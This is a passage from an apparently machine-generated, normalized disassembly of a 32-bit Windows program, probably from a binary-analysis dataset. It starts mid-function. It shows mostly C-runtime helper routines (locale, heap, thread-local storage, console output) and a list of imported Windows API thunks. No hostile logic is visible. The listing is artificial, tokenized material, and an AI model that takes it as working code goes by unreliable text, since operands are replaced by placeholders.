mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_40bf44
sub_413ce1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_413cb8
sub_413cfd
call sub_40af3b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_40bf44
sub_413d23
call sub_40af3b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_40bf44
sub_413d49
call sub_40af3b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
add eax 0xc
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_40bf44
sub_413dc4
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_413d6f
sub_413dcf
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
pop ebp
retn
sub_4140f3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_413e9d
add esp 0x14
pop ebp
retn
sub_41413c
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_413e9d
add esp 0x14
pop ebp
retn
sub_4143ee
push ebx
call sub_40fffa
pop ecx
retn
sub_41461f
push ebx
call sub_40fffa
pop ecx
retn
sub_41481c
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rwxdata ] eax
retn
sub_41483b
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_414852
mov eax ecx
and [ eax ] 0x0
retn
sub_414de5
mov eax [ rwxdata ]
not eax
and eax 0x1
retn
sub_414df0
mov eax [ rwxdata ]
shr eax 0x1
not eax
and eax 0x1
retn
sub_414dfd
mov eax [ rwxdata ]
shr eax 0x11
not eax
and eax 0x1
retn
sub_414e0b
mov eax [ rwxdata ]
shr eax 0x2
not eax
and eax 0x1
retn
sub_414e19
mov eax [ rwxdata ]
shr eax 0x3
not eax
and eax 0x1
retn
sub_414e27
mov eax [ rwxdata ]
shr eax 0x4
not eax
and eax 0x1
retn
sub_414e35
mov eax [ rwxdata ]
and eax 0x60
xor ecx ecx
cmp al 0x60
setne cl
mov eax ecx
retn
sub_414e47
mov eax [ rwxdata ]
shr eax 0x7
not eax
and eax 0x1
retn
sub_414e55
mov eax [ rwxdata ]
shr eax 0x8
not eax
and eax 0x1
retn
sub_414e63
mov eax [ rwxdata ]
shr eax 0x9
not eax
and eax 0x1
retn
sub_414e71
mov eax [ rwxdata ]
and eax 0x1000
retn
sub_414e7c
mov eax [ rwxdata ]
and eax 0x2000
retn
sub_414e87
mov eax [ rwxdata ]
and eax 0x4000
retn
sub_414e92
mov eax [ rwxdata ]
shr eax 0xf
not eax
and eax 0x1
retn
sub_414ea0
mov eax [ rwxdata ]
and eax 0x10000
retn
sub_414eab
mov eax [ rwxdata ]
shr eax 0x12
not eax
and eax 0x1
retn
sub_414f60
mov eax ecx
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
retn
sub_414f71
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_414f89
xor eax eax
cmp [ ecx + 0x4 ] 0x1
setle al
retn
sub_414f93
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_414f9b
movsx eax [ ecx + 0x4 ]
retn
sub_414fa0
mov eax ecx
or [ eax + 0x4 ] 0x100
retn
sub_414faa
mov eax [ ecx + 0x4 ]
shr eax 0x8
and eax 0x1
retn
sub_414fb4
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x200
je r-xdata
inc eax
sub_414fc5
cmp [ ecx ] 0x0
je r-xdata
retn
or [ ecx + 0x4 ] 0x200
sub_414fd2
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x400
je r-xdata
inc eax
sub_414fe3
or [ ecx + 0x4 ] 0x800
retn
sub_414feb
mov eax [ ecx + 0x4 ]
shr eax 0xb
and eax 0x1
retn
sub_414ff5
mov eax [ ecx + 0x4 ]
shr eax 0xc
and eax 0x1
retn
sub_414fff
or [ ecx + 0x4 ] 0x1000
retn
sub_415007
mov eax [ ecx + 0x4 ]
shr eax 0xd
and eax 0x1
retn
sub_415011
or [ ecx + 0x4 ] 0x2000
retn
sub_415019
mov eax [ ecx + 0x4 ]
shr eax 0xe
and eax 0x1
retn
sub_415023
or [ ecx + 0x4 ] 0x4000
retn
sub_41502b
mov eax [ ecx + 0x4 ]
shr eax 0xf
and eax 0x1
retn
sub_415035
or [ ecx + 0x4 ] 0x8000
retn
sub_41503d
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
jmp [ eax ]
xor eax eax
retn
sub_415058
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_41508f
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_4150a7
xor eax eax
cmp [ ecx ] 0x9
sete al
retn
sub_4150b0
mov eax ecx
or [ eax ] 0xffffffff
retn
sub_4150b6
mov eax ecx
mov [ eax ] r--data
retn
sub_4150bf
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov cl [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
sub_4150d6
xor eax eax
inc eax
retn
sub_4150da
mov al [ ecx + 0x4 ]
retn
sub_4150de
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
pop ebp
retn 0x8
mov cl [ ecx + 0x4 ]
mov [ eax ] cl
inc eax
sub_41511f
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx ]
sub_415192
mov eax [ ecx + 0x8 ]
retn
sub_415196
cmp [ ecx + 0x4 ] 0x1
setne al
dec al
and al 0x20
retn
sub_415228
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
or [ eax + 0xc ] 0xffffffff
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x8
sub_4152bc
xor eax eax
cmp [ ecx ] al
je r-xdata
retn
inc eax
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
sub_4153ec
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov ecx rwxdata
push [ ebp + 0x8 ]
call sub_414ed8
pop ebp
retn
sub_4156ed
mov eax [ ecx + 0x8 ]
retn
sub_4156f1
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
xor al al
retn
mov ecx [ ecx + 0x4 ]
mov al [ ecx + eax - 0x1 ]
retn
sub_415703
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415403
add esp 0x10
pop ebp
retn 0x8
sub_41577a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_415379
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_41676a
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_415fd3
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_416780
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_415fd3
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_416796
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_415fd3
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_416de7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4167ac
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_417a31
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_417950
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_4199cf
mov edi edi
push ebp
mov ebp esp
push r--data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4198d6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_4199ef
mov edi edi
push ebp
mov ebp esp
push r--data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4198d6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_419a0f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4198d6
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_419abe
push 0x5
call sub_40ebdd
pop ecx
retn
sub_419b58
push 0x5
call sub_40ebdd
pop ecx
retn
sub_41a440
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40fdc0
sub_41a456
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40fdc0
sub_41a556
mov eax [ rwxdata ]
retn
sub_41a55c
mov eax rwxdata
retn
sub_41a5e6
mov eax [ rwxdata ]
mov ecx [ eax + 0xbc ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rwxdata ] ecx
mov eax [ eax + 0xac ]
mov [ rwxdata ] eax
retn
sub_41a6bc
push 0xd
call sub_40ebdd
pop ecx
retn
sub_41a6c8
push 0xc
call sub_40ebdd
pop ecx
retn
sub_41a6d1
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41a60f
sub_41a776
push 0xc
call sub_40ebdd
pop ecx
retn
sub_41a782
push 0xd
call sub_40ebdd
pop ecx
retn
j_sub_41a6dc
jmp sub_41a6dc
sub_41a790
xor eax eax
retn
sub_41b32f
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41b23a
sub_41b46c
push 0xc
call sub_40ebdd
pop ecx
retn
sub_41b478
push 0xc
call sub_40ebdd
pop ecx
retn
sub_41b481
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b4a9
mov eax [ ebp - 0x20 ]
call sub_4083c5
retn
sub_41b4a9
and [ esi + 0x70 ] 0xffffffef
retn
sub_41b4ae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
pop ebp
retn
sub_41b661
push [ rwxdata ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_40a554
push 0x1
push 0x0
call sub_41a250
add esp 0xc
jmp sub_41a21d
call eax
sub_41b6b2
push [ rwxdata ]
call [ DecodePointer@IAT ]
retn
sub_41b6bf
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_4140c8
add esp 0xc
pop ebp
retn
sub_41b6d5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_4140f3
add esp 0x10
pop ebp
retn
sub_41b6ee
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41b6bf
sub_41b6f9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41b6d5
sub_41b704
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_41ed0d
add esp 0xc
pop ebp
retn
sub_41b71a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_41ed38
add esp 0x10
pop ebp
retn
sub_41b733
xor eax eax
retn
sub_41b858
or [ esi + 0x8 ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x1c ] eax
mov [ esi + 0x18 ] eax
retn
sub_41bfb4
test eax eax
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
sub_41bfc4
movzx eax [ eax ]
movzx ecx [ ecx ]
sub eax ecx
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
sub_41ed38
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_41ea70
add esp 0x14
pop ebp
retn
sub_41ed81
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_41ea70
add esp 0x14
pop ebp
retn
sub_41efe9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_41eede
pop ebp
retn
GetLastError
jmp [ GetLastError@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
HeapSetInformation
jmp [ HeapSetInformation@IAT ]
GetStartupInfoW
jmp [ GetStartupInfoW@IAT ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
DecodePointer
jmp [ DecodePointer@IAT ]
EncodePointer
jmp [ EncodePointer@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
InitializeCriticalSectionAndSpinCount
jmp [ InitializeCriticalSectionAndSpinCount@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetConsoleCP
jmp [ GetConsoleCP@IAT ]
GetConsoleMode
jmp [ GetConsoleMode@IAT ]
SetHandleCount
jmp [ SetHandleCount@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
RaiseException
jmp [ RaiseException@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
FreeEnvironmentStringsW
jmp [ FreeEnvironmentStringsW@IAT ]
GetEnvironmentStringsW
jmp [ GetEnvironmentStringsW@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
__imp_GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
__imp_GetCurrentThread
jmp [ GetCurrentThread@IAT ]
HeapCreate
jmp [ HeapCreate@IAT ]
HeapDestroy
jmp [ HeapDestroy@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
IsValidCodePage
jmp [ IsValidCodePage@IAT ]
Sleep
jmp [ Sleep@IAT ]
FatalAppExitA
jmp [ FatalAppExitA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
WriteConsoleW
jmp [ WriteConsoleW@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
SetStdHandle
jmp [ SetStdHandle@IAT ]
FlushFileBuffers
jmp [ FlushFileBuffers@IAT ]
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
HeapSize
jmp [ HeapSize@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
LoadLibraryW
jmp [ LoadLibraryW@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
LCMapStringW
jmp [ LCMapStringW@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
CreateFileW
jmp [ CreateFileW@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
EnumSystemLocalesA
jmp [ EnumSystemLocalesA@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
sub_41f35e
mov [ rwxdata ] r--data
mov ecx rwxdata
jmp sub_409bf4
